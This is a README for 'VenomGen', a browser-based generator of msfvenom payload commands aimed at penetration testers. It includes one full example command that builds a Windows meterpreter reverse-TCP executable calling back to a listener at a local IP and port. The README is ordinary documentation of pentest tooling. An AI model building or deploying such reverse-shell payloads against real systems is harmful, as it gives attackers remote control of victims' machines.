# MSFvenom Command Generator

This project is a simple MSFvenom Command Generator built with HTML, CSS, and JavaScript. It allows users to easily generate msfvenom payload commands by selecting payloads, configuring LHOST and LPORT values, and choosing the desired output format. This tool simplifies the process of crafting msfvenom commands for penetration testing purposes.

## Features

- **Payload Selection**: Choose from various payloads categorized into binaries, scripting, shellcode, and user creation.

- **Dynamic Form Fields**: Automatically update required fields based on the selected payload.

- **Customizable Output**: Select the desired output format (e.g., exe, elf, raw) and specify an output filename.

- **Command Generation**: Generate the msfvenom command dynamically and copy it for use.

## How to Use

1. Follow [this](https://mohitpimoli.github.io/VenomGen/) link.

2. Select the desired payload from the dropdown list.

3. Fill in the required fields (LHOST, LPORT, etc.).

4. Choose the output format and specify a filename.

5. Click the **Generate Command** button to generate the msfvenom command.

6. Copy the generated command and use it in your terminal.

## File Structure

```bash
msfvenom-command-generator/
|-- assets/
|   |-- css/
|       |-- styles.css             # Styles for the interface
|   |-- img/
|       |-- favicon-potion.png     # Favicon icon
|   |-- js/
|       |-- script.js              # JavaScript for dynamic field updates and command generation
|-- index.html                     # Main HTML file
|-- README.md                      # Project documentation
```

## Example

Generated command example for Windows reverse shell:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o shell.exe
```

## Requirements

Any modern web browser (Chrome, Firefox, Edge, etc.).

Basic understanding of msfvenom and penetration testing.

## Contributing

Contributions are welcome! If you find any issues or have feature suggestions, feel free to open an issue or submit a pull request.

## License

This project is licensed under the [MIT License](LICENSE). For more details, refer to the [MIT License](https://opensource.org/license/mit-0) file.

## Disclaimer

For educational and testing purposes only. Misuse of this tool for malicious activities is strictly prohibited
